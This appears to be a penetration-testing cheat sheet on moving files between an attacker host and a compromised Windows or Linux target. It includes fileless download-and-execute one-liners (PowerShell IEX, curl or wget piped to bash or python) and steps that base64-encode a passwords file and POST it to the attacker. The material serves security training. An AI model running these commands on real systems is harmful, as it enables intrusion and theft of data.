# 📁 File Transfers

In the profane rites of assessment, the movement of relics—scripts, payloads, and binaries—is both necessary and perilous. This chapter reveals methods for casting files across dimensions, utilizing primitive yet persistent protocols shared among ancient systems both Windows and Linux.

> _"No summoning may begin until the runes are in place."_

---

<details>
<summary><h1>🪟 Windows</h1></summary>

<details>
<summary><h2>📥 Downloads</h2></summary>

<details>
<summary><h3>PowerShell Downloads</h3></summary>

<details>
<summary><h4>PowerShell DownloadFile Method</h4></summary>

**Sync (Wait for the download to finish)**

No password:

<table width="100%">
<tr>
<td colspan="2"> ⚡ <b>PowerShell — Windows - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`PS C:\Users\User >`**

</td>
<td>

```powershell
(New-Object Net.WebClient).DownloadFile('http://<IP>:<PORT>/<FILE>','C:\Users\Public\<FILE>')
```

</td>
</tr>
</table>

Using Credentials:

<table width="100%">
<tr>
<td colspan="2"> ⚡ <b>PowerShell — Windows - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`PS C:\Users\User >`**

</td>
<td>

```powershell
(New-Object Net.WebClient -Property @{Credentials = New-Object System.Net.NetworkCredential('<USER>', '<PASSWORD>')}).DownloadFile('http://<IP>:<PORT>/<FILE>', 'C:\Users\Public\<FILE>')
```

</td>
</tr>
</table>

**Async (Keep using PowerShell while downloading)**

No password:

<table width="100%">
<tr>
<td colspan="2"> ⚡ <b>PowerShell — Windows - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`PS C:\Users\User >`**

</td>
<td>

```powershell
(New-Object Net.WebClient).DownloadFileAsync('http://<IP>:<PORT>/<FILE>','C:\Users\Public\<FILE>')
```

</td>
</tr>
</table>

Using Credentials:

<table width="100%">
<tr>
<td colspan="2"> ⚡ <b>PowerShell — Windows - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`PS C:\Users\User >`**

</td>
<td>

```powershell
(New-Object Net.WebClient -Property @{Credentials = New-Object System.Net.NetworkCredential('<USER>', '<PASSWORD>')}).DownloadFileAsync('http://<IP>:<PORT>/<FILE>', 'C:\Users\Public\<FILE>')
```

</td>
</tr>
</table>

</details>

<details>
<summary><h4>PowerShell DownloadString - Fileless Method</h4></summary>

Default:

<table width="100%">
<tr>
<td colspan="2"> ⚡ <b>PowerShell — Windows - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`PS C:\Users\User >`**

</td>
<td>

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://<IP>:<PORT>/<FILE>')
```

</td>
</tr>
</table>

Pipeline input:

<table width="100%">
<tr>
<td colspan="2"> ⚡ <b>PowerShell — Windows - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`PS C:\Users\User >`**

</td>
<td>

```powershell
(New-Object Net.WebClient).DownloadString('http://<IP>:<PORT>/<FILE>') | IEX
```

</td>
</tr>
</table>

</details>

<details>
<summary><h4>PowerShell Invoke-WebRequest</h4></summary>

Default:

<table width="100%">
<tr>
<td colspan="2"> ⚡ <b>PowerShell — Windows - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`PS C:\Users\User >`**

</td>
<td>

```powershell
Invoke-WebRequest http://<IP>:<PORT>/<FILE> -OutFile <OUTPUT FILE>
```

</td>
</tr>
</table>

With Authentication:

<table width="100%">
<tr>
<td colspan="2"> ⚡ <b>PowerShell — Windows - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`PS C:\Users\User >`**

</td>
<td>

```powershell
Invoke-WebRequest -Uri "http://<IP>:<PORT>/<FILE>" -Headers @{"Authorization"="Basic "+[Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("<USER>:<PASSWORD>"))} -OutFile "C:\Users\Public\<FILE>"
```

</td>
</tr>
</table>

ByPass Internet Explorer Error:

<table width="100%">
<tr>
<td colspan="2"> ⚡ <b>PowerShell — Windows - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`PS C:\Users\User >`**

</td>
<td>

```powershell
Invoke-WebRequest http://<IP>:<PORT>/<FILE> -UseBasicParsing | IEX
```

</td>
</tr>
</table>

Skip SSL validation (PowerShell 7+):

<table width="100%">
<tr>
<td colspan="2"> ⚡ <b>PowerShell — Windows - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`PS C:\Users\User >`**

</td>
<td>

```powershell
Invoke-WebRequest -Uri "https://<IP>:<PORT>/<FILE>" -OutFile "<FILE>" -SkipCertificateCheck
```

</td>
</tr>
</table>

Skip SSL validation (PowerShell 5.1 or previous):

<table width="100%">
<tr>
<td colspan="2"> ⚡ <b>PowerShell — Windows - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`PS C:\Users\User >`**

</td>
<td>

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile("https://<IP>:<PORT>/<FILE>", "<FILE>")
```

</td>
</tr>
</table>

</details>

</details>

<details>
<summary><h3>SMB Downloads</h3></summary>

<details>
<summary><h4>Default</h4></summary>

1. **Create** a temporary SMB Share on AttackHost

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
mkdir /tmp/smbshare
cd /tmp/smbshare
mv <FILE> .
chmod 644 <FILE>
sudo impacket-smbserver share -smb2support .
```

</td>
</tr>
</table>

2. **Download** the files on Target

Option 1 - Download a single file:

<table width="100%">
<tr>
<td colspan="2"> 📟 <b>CMD — Windows - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`C:\System32 >`**

</td>
<td>

```cmd
copy \\<IP>\share\<FILE>
```

</td>
</tr>
</table>

Option 2 - Mount the share:

<table width="100%">
<tr>
<td colspan="2"> 📟 <b>CMD — Windows - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`C:\System32 >`**

</td>
<td>

```cmd
net use n: \\<IP>\share /persistent:no
```

</td>
</tr>
</table>

</details>

<details>
<summary><h4>Using credentials</h4></summary>

1. **Create** the SMB Server on AttackHost

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user <USER> -password <PASSWORD>
```

</td>
</tr>
</table>

2. **Mount** the share on Target

<table width="100%">
<tr>
<td colspan="2"> 📟 <b>CMD — Windows - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`C:\System32 >`**

</td>
<td>

```cmd
net use n: \\<IP>\share /user:<USER> <PASSWORD>
```

</td>
</tr>
</table>

3. **Download** the file

<table width="100%">
<tr>
<td colspan="2"> 📟 <b>CMD — Windows - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`C:\System32 >`**

</td>
<td>

```cmd
copy n:\<FILE>
```

</td>
</tr>
</table>

4. **Unmount** the share

<table width="100%">
<tr>
<td colspan="2"> 📟 <b>CMD — Windows - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`C:\System32 >`**

</td>
<td>

```cmd
net use n: /delete /y
```

</td>
</tr>
</table>

</details>

</details>

<details>
<summary><h3>FTP Downloads</h3></summary>

1. **Start** Python3 FTP Server on AttackHost

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21 --user <USER> --password '<PASSWORD>'
```

</td>
</tr>
</table>

2. **Download** file on Target

Using PowerShell:

<table width="100%">
<tr>
<td colspan="2"> ⚡ <b>PowerShell — Windows - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`PS C:\Users\User >`**

</td>
<td>

```powershell
(New-Object Net.WebClient -Property @{Credentials = New-Object System.Net.NetworkCredential('<USER>', '<PASSWORD>')}).DownloadFile('ftp://<IP>/<FILE>', 'C:\Users\Public\<FILE>')
```

</td>
</tr>
</table>

Using CMD:

<table width="100%">
<tr>
<td colspan="2"> 📟 <b>CMD — Windows - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`C:\System32 >`**

</td>
<td>

```cmd
(
  echo open <IP>
  echo user ftpuser ftppass
  echo binary
  echo get <FILE>
  echo bye
) > ftpcommand.txt
ftp -i -v -n -s:ftpcommand.txt
```

</td>
</tr>
</table>

</details>

</details>

<details>
<summary><h2>📤 Uploads</h2></summary>

<details>
<summary><h3>PowerShell Uploads</h3></summary>

<details>
<summary><h4>PowerShell Base64 Encode & Decode</h4></summary>

1. **Encode** file on Target (Windows)

<table width="100%">
<tr>
<td colspan="2"> ⚡ <b>PowerShell — Windows - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`PS C:\Users\User >`**

</td>
<td>

```powershell
# Convert File to Base64
[Convert]::ToBase64String((Get-Content -path "<FILE PATH>" -Encoding byte))

# Compute MD5 checksum to verify integrity
Get-FileHash "<FILE PATH>" -Algorithm MD5 | select Hash
```

</td>
</tr>
</table>

2. **Decode** Base64 string on AttackHost (Linux)

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# Save the base64 string to a file
echo "<BASE64STRING>" > encoded.b64

# Decode the base64 to recreate the original file
base64 -d encoded.b64 > decoded.txt

# Verify the MD5 hash matches the Windows version
md5sum decoded.txt
```

</td>
</tr>
</table>

</details>

<details>
<summary><h4>PowerShell Web Uploads</h4></summary>

1. **Start** upload server on AttackHost (Linux)

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
pip3 install uploadserver
python3 -m uploadserver --allow-replace 8000
```

</td>
</tr>
</table>

2. **Upload** the file from Target (Windows)

<table width="100%">
<tr>
<td colspan="2"> ⚡ <b>PowerShell — Windows - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`PS C:\Users\User >`**

</td>
<td>

```powershell
curl.exe -X POST http://<IP>:<PORT>/upload -F "files=@C:\Users\Cartman\Desktop\FileToUpload.txt"
```

</td>
</tr>
</table>

</details>

<details>
<summary><h4>PowerShell Base64 Web Upload</h4></summary>

Script needed: [`linux_file_receiver.py`](../scripts/file_transfers/linux_file_receiver.py)

1. **Start** Web Server on AttackHost (Linux)

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# Start server (default port 4444)
python3 file_receiver.py

# Start server on custom port
python3 file_receiver.py --port <PORT>
```

</td>
</tr>
</table>

2. **Convert** file to Base64 on Target (Windows)

<table width="100%">
<tr>
<td colspan="2"> ⚡ <b>PowerShell — Windows - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`PS C:\Users\User >`**

</td>
<td>

```powershell
$file = "C:\Users\bob\Desktop\passwords.txt"
$b64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($file))
```

</td>
</tr>
</table>

3. **Send** to AttackHost

<table width="100%">
<tr>
<td colspan="2"> ⚡ <b>PowerShell — Windows - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`PS C:\Users\User >`**

</td>
<td>

```powershell
Invoke-WebRequest -Uri "http://<IP>:<PORT>/" -Method POST -Body $b64 -Headers @{"X-Filename"="passwords.txt"} -ContentType "text/plain" -UseBasicParsing
```

</td>
</tr>
</table>

4. **Rename** and restore original format on AttackHost

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
mv <RECEIVED FILE> <FILE>
file ThisisATextFile.txt
```

</td>
</tr>
</table>

</details>

</details>

<details>
<summary><h3>SMB Uploads</h3></summary>

1. **Start** WebDav server on AttackHost (Linux)

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=<PORT> --root=/tmp --auth=anonymous
```

</td>
</tr>
</table>

2. **Upload** files from Target (Windows)

<table width="100%">
<tr>
<td colspan="2"> 📟 <b>CMD — Windows - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`C:\System32 >`**

</td>
<td>

```cmd
REM DavWWWRoot is a special keyword recognized by the Windows Shell
dir \\192.168.49.128\DavWWWRoot
copy <FILE PATH> \\<IP>\DavWWWRoot\

REM Or use a folder that exists on your server
copy <FILE PATH> \\<IP>\sharefolder\
```

</td>
</tr>
</table>

> **NOTE:** If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.

</details>

<details>
<summary><h3>FTP Uploads</h3></summary>

1. **Start** FTP Server on AttackHost (Linux)

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
sudo python3 -m pyftpdlib --port 21 --write
```

</td>
</tr>
</table>

2. **Upload** the file from Target (Windows)

Using PowerShell:

<table width="100%">
<tr>
<td colspan="2"> ⚡ <b>PowerShell — Windows - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`PS C:\Users\User >`**

</td>
<td>

```powershell
(New-Object Net.WebClient).UploadFile('ftp://<IP>/ftp-hosts', '<FILE PATH>')
```

</td>
</tr>
</table>

Using CMD (command file):

<table width="100%">
<tr>
<td colspan="2"> 📟 <b>CMD — Windows - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`C:\System32 >`**

</td>
<td>

```cmd
echo open <IP> > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT <FILE PATH> >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

</td>
</tr>
</table>

</details>

</details>

</details>

---

<details>
<summary><h1>🐧 Linux</h1></summary>

<details>
<summary><h2>📥 Downloads</h2></summary>

<details>
<summary><h3>Base64 Encoding / Decoding</h3></summary>

1. **Check** MD5 hash and **encode** file on AttackHost

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
md5sum <FILE>
cat <FILE> | base64 -w 0; echo
```

</td>
</tr>
</table>

2. **Decode** the file on Target

<table width="100%">
<tr>
<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`target@victim:~$`**

</td>
<td>

```bash
echo -n '<BASE64STRING>' | base64 -d > <OUTPUT FILE>
md5sum <FILE>
```

</td>
</tr>
</table>

</details>

<details>
<summary><h3>Wget Downloads</h3></summary>

<table width="100%">
<tr>
<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`target@victim:~$`**

</td>
<td>

```bash
# Basic Download
wget http://<IP>:<PORT>/<FILE>

# Download a folder
wget -r -np -nH --cut-dirs=1 -R "index.html*" http://<IP>:<PORT>/<FOLDER>/

# Download with Custom Filename
wget -O <OUTPUT FILE> http://<IP>:<PORT>/<FILE>

# Download with Authentication
wget --user=<USER> --password=<PASSWORD> http://<IP>:<PORT>/<FILE>

# Fileless Download (executes directly)
wget -qO- http://<IP>:<PORT>/<FILE> | python3
```

</td>
</tr>
</table>

</details>

<details>
<summary><h3>Curl Downloads</h3></summary>

<table width="100%">
<tr>
<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`target@victim:~$`**

</td>
<td>

```bash
# Basic Download
curl -o <OUTPUT_FILE> http://<IP>:<PORT>/<FILE>

# Ignore SSL certificate
curl -k -o <OUTPUT_FILE> https://<IP>:<PORT>/<FILE>

# Download with Authentication
curl -u <USER>:<PASSWORD> -o <OUTPUT FILE> http://<IP>:<PORT>/<FILE>

# Fileless Download (executes directly)
curl http://<IP>:<PORT>/<FILE> | bash
```

</td>
</tr>
</table>

</details>

<details>
<summary><h3>Download with Bash /dev/tcp</h3></summary>

<table width="100%">
<tr>
<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`target@victim:~$`**

</td>
<td>

```bash
# Connect to the Target Webserver
exec 3<>/dev/tcp/<IP>/<PORT>

# HTTP GET Request
echo -e "GET /<FILE> HTTP/1.1\n\n">&3

# Print the Response
cat <&3
```

</td>
</tr>
</table>

</details>

<details>
<summary><h3>SSH/SCP Downloads</h3></summary>

1. **Start** SSH Server on AttackHost

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
sudo systemctl enable ssh
sudo systemctl start ssh
netstat -lnpt  # Check for 0.0.0.0:22
```

</td>
</tr>
</table>

2. **Download** files on Target

<table width="100%">
<tr>
<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`target@victim:~$`**

</td>
<td>

```bash
scp user@<ATTACKHOST_IP>:/remote/path/<FILE> /local/path/
```

</td>
</tr>
</table>

</details>

</details>

<details>
<summary><h2>📤 Uploads</h2></summary>

<details>
<summary><h3>Web Upload</h3></summary>

<details>
<summary><h4>Python UploadServer (Basic)</h4></summary>

1. **Start** Web Server on AttackHost

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
sudo python3 -m pip install --user uploadserver
sudo python3 -m uploadserver <PORT>
```

</td>
</tr>
</table>

2. **Upload** the file from Target

<table width="100%">
<tr>
<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`target@victim:~$`**

</td>
<td>

```bash
curl -F "files=@<FILE>" http://<ATTACKHOST_IP>:<PORT>/upload
```

</td>
</tr>
</table>

</details>

<details>
<summary><h4>Authenticated Web Server</h4></summary>

1. **Create** server.py on AttackHost

<table width="100%">
<tr>
<td> 🐍 <b>Python — Script</b> </td>
</tr>
<tr>
<td>

```python
# server.py
from http.server import HTTPServer, SimpleHTTPRequestHandler
import base64

class AuthHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        auth = self.headers.get('Authorization')
        if not auth or not auth.startswith('Basic '):
            self.send_response(401)
            self.send_header('WWW-Authenticate', 'Basic realm="Secure Area"')
            self.end_headers()
            return

        username, password = base64.b64decode(auth[6:]).decode().split(':', 1)
        if username == '<USER>' and password == '<PASSWORD>':
            super().do_GET()
        else:
            self.send_response(403)
            self.end_headers()
            self.wfile.write(b'Access denied')

HTTPServer(('0.0.0.0', <PORT>), AuthHandler).serve_forever()
```

</td>
</tr>
</table>

2. **Start** Web Server

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
sudo python3 server.py
```

</td>
</tr>
</table>

> **NOTE:** Refer to the "Downloads" section for available transfer methods on Target.

</details>

</details>

<details>
<summary><h3>SCP Uploads</h3></summary>

<table width="100%">
<tr>
<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`target@victim:~$`**

</td>
<td>

```bash
# Upload to Remote Server
scp <FILE> <USER>@<ATTACKHOST_IP>:~

# Upload with Custom Port
scp -P <PORT> <FILE> <USER>@<ATTACKHOST_IP>:~

# Upload with Key Authentication
scp -i <KEY FILE> <FILE> <USER>@<ATTACKHOST_IP>:~
```

</td>
</tr>
</table>

</details>

<details>
<summary><h3>FTP Uploads</h3></summary>

<table width="100%">
<tr>
<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`target@victim:~$`**

</td>
<td>

```bash
# Using FTP Command
ftp <ATTACKHOST_IP>
# Once connected:
put <FILE>

# Using lftp
lftp -u <USER>,<PASSWORD> <ATTACKHOST_IP>
# Once connected:
put <FILE>
```

</td>
</tr>
</table>

</details>

<details>
<summary><h3>Alternative Web File Transfer</h3></summary>

A compromised Linux machine may not have a web server installed. In such cases, we can use a mini web server.

<table width="100%">
<tr>
<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`target@victim:~$`**

</td>
<td>

```bash
# Creating a Web Server with Python3
python3 -m http.server 8000

# Creating a Web Server with Python2.7
python2.7 -m SimpleHTTPServer 8000

# Creating a Web Server with PHP
php -S 0.0.0.0:8000

# Creating a Web Server with Ruby
ruby -run -ehttpd . -p8000
```

</td>
</tr>
</table>

> **NOTE:** Refer to the "Downloads" section for available transfer methods on AttackHost.

</details>

</details>

</details>

---

<details>
<summary><h1>💻 Code</h1></summary>

<details>
<summary><h2>📥 Downloads</h2></summary>

<details>
<summary><h3>Python</h3></summary>

<table width="100%">
<tr>
<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`target@victim:~$`**

</td>
<td>

```bash
# Python 3
python3 -c 'import urllib.request;urllib.request.urlretrieve("http://<IP>:<PORT>/<FILE>", "<OUTPUT FILE>")'

# Python 2
python2.7 -c 'import urllib;urllib.urlretrieve ("http://<IP>:<PORT>/<FILE>", "<OUTPUT FILE>")'
```

</td>
</tr>
</table>

</details>

<details>
<summary><h3>PHP</h3></summary>

<table width="100%">
<tr>
<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`target@victim:~$`**

</td>
<td>

```bash
# PHP Download with File_get_contents()
php -r '$file = file_get_contents("http://<IP>:<PORT>/<FILE>"); file_put_contents("<OUTPUT FILE>",$file);'

# PHP Download with Fopen()
php -r 'const BUFFER = 1024; $fremote = fopen("http://<IP>:<PORT>/<FILE>", "rb"); $flocal = fopen("<OUTPUT FILE>", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

# PHP Download and Pipe to Bash
php -r '$lines = @file("http://<IP>:<PORT>/<FILE>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

</td>
</tr>
</table>

</details>

<details>
<summary><h3>Ruby</h3></summary>

<table width="100%">
<tr>
<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`target@victim:~$`**

</td>
<td>

```bash
ruby -e 'require "net/http"; File.write("<OUTPUT FILE>", Net::HTTP.get(URI.parse("http://<IP>:<PORT>/<FILE>")))'
```

</td>
</tr>
</table>

</details>

<details>
<summary><h3>Perl</h3></summary>

<table width="100%">
<tr>
<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`target@victim:~$`**

</td>
<td>

```bash
perl -e 'use LWP::Simple; getstore("http://<IP>:<PORT>/<FILE>", "<OUTPUT FILE>");'
```

</td>
</tr>
</table>

</details>

<details>
<summary><h3>JavaScript (Windows)</h3></summary>

1. **Create** the script wget.js

<table width="100%">
<tr>
<td> 🟨 <b>JavaScript — Script</b> </td>
</tr>
<tr>
<td>

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/ false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

</td>
</tr>
</table>

2. **Execute** the script on Target

<table width="100%">
<tr>
<td colspan="2"> 📟 <b>CMD — Windows - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`C:\System32 >`**

</td>
<td>

```cmd
cscript.exe /nologo wget.js http://<IP>:<PORT>/<FILE> <OUTPUT FILE>
```

</td>
</tr>
</table>

</details>

<details>
<summary><h3>VBScript (Windows)</h3></summary>

1. **Create** the script wget.vbs

<table width="100%">
<tr>
<td> 📄 <b>VBScript — Script</b> </td>
</tr>
<tr>
<td>

```vb
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

</td>
</tr>
</table>

2. **Execute** the script on Target

<table width="100%">
<tr>
<td colspan="2"> 📟 <b>CMD — Windows - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`C:\System32 >`**

</td>
<td>

```cmd
cscript.exe /nologo wget.vbs http://<IP>:<PORT>/<FILE> <OUTPUT FILE>
```

</td>
</tr>
</table>

</details>

</details>

<details>
<summary><h2>📤 Uploads</h2></summary>

<details>
<summary><h3>Python</h3></summary>

<table width="100%">
<tr>
<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`target@victim:~$`**

</td>
<td>

```bash
python3 -c 'import requests;requests.post("http://<ATTACKHOST_IP>:<PORT>/uploads/path/",files={"files":open("<LOCAL FILE>")})'
```

</td>
</tr>
</table>

</details>

</details>

</details>

---

<details>
<summary><h1>🧰 Miscellaneous</h1></summary>

<details>
<summary><h2>📡 NC</h2></summary>

<details>
<summary><h3>Netcat</h3></summary>

**Standard Transfer (AttackHost → Target)**

1. **Listen** on Target

<table width="100%">
<tr>
<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`target@victim:~$`**

</td>
<td>

```bash
nc -lvnp 8000 > <OUTPUT FILE>
```

</td>
</tr>
</table>

2. **Send** file from AttackHost

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
nc -q 0 <TARGET_IP> 8000 < <LOCAL FILE>
```

</td>
</tr>
</table>

**Reverse Transfer (Target → AttackHost)**

Useful when inbound connections are blocked by a firewall.

1. **Listen** on AttackHost

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
sudo nc -l -p 443 -q 0 < <LOCAL FILE>
```

</td>
</tr>
</table>

2. **Connect** and receive on Target

<table width="100%">
<tr>
<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`target@victim:~$`**

</td>
<td>

```bash
nc <ATTACKHOST_IP> 443 > <OUTPUT FILE>
```

</td>
</tr>
</table>

</details>

<details>
<summary><h3>Ncat</h3></summary>

**Standard Transfer (AttackHost → Target)**

1. **Listen** on Target

<table width="100%">
<tr>
<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`target@victim:~$`**

</td>
<td>

```bash
ncat -l -p 8000 --recv-only > <OUTPUT FILE>
```

</td>
</tr>
</table>

2. **Send** file from AttackHost

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
ncat --send-only <TARGET_IP> 8000 < <LOCAL FILE>
```

</td>
</tr>
</table>

**Reverse Transfer (Target → AttackHost)**

1. **Listen** on AttackHost

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
sudo ncat -l -p 443 --send-only < <LOCAL FILE>
```

</td>
</tr>
</table>

2. **Connect** and receive on Target

<table width="100%">
<tr>
<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`target@victim:~$`**

</td>
<td>

```bash
ncat <ATTACKHOST_IP> 443 --recv-only > <OUTPUT FILE>
```

</td>
</tr>
</table>

</details>

<details>
<summary><h3>Bash /dev/tcp</h3></summary>

If Netcat or Ncat are not available, Bash can use the pseudo-device `/dev/tcp/host/port` for file transfers.

<table width="100%">
<tr>
<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
</tr>
<tr>
<td width="20%">

**`target@victim:~$`**

</td>
<td>

```bash
cat < /dev/tcp/<ATTACKHOST_IP>/443 > <OUTPUT FILE>
```

</td>
</tr>
</table>

> **NOTE:** This method can also be used to transfer files from the compromised host to your AttackHost by reversing the direction of the connection.

</details>

</details>

<details>
<summary><h2>🖥️ RDP</h2></summary>

<details>
<summary><h3>File Transfer via RDP Clipboard</h3></summary>

You can transfer files between your local machine and a remote Windows host using the RDP clipboard (copy-paste) feature. This is supported by most RDP clients if clipboard redirection is enabled.

**On your RDP client (Windows mstsc.exe):**

1. **Open** `mstsc.exe`
2. **Go** to "Show Options" > "Local Resources" tab
3. **Ensure** "Clipboard" is checked
4. **Connect** to the remote host
5. **Copy** files on your local machine and paste them into the remote desktop (or vice versa)

</details>

<details>
<summary><h3>File Transfer via RDP Shared Drives</h3></summary>

You can map a local drive to the remote session, making it accessible from the remote host.

**On your RDP client (Windows mstsc.exe):**

1. **Open** `mstsc.exe`
2. **Go** to "Show Options" > "Local Resources" tab
3. **Click** "More..." under "Local devices and resources"
4. **Check** the drives you want to share
5. **Connect** to the remote host
6. The shared drive will appear in "This PC" on the remote desktop

</details>

<details>
<summary><h3>File Transfer via xfreerdp (Linux)</h3></summary>

If you are using Linux, you can use `xfreerdp` to enable clipboard and drive redirection.

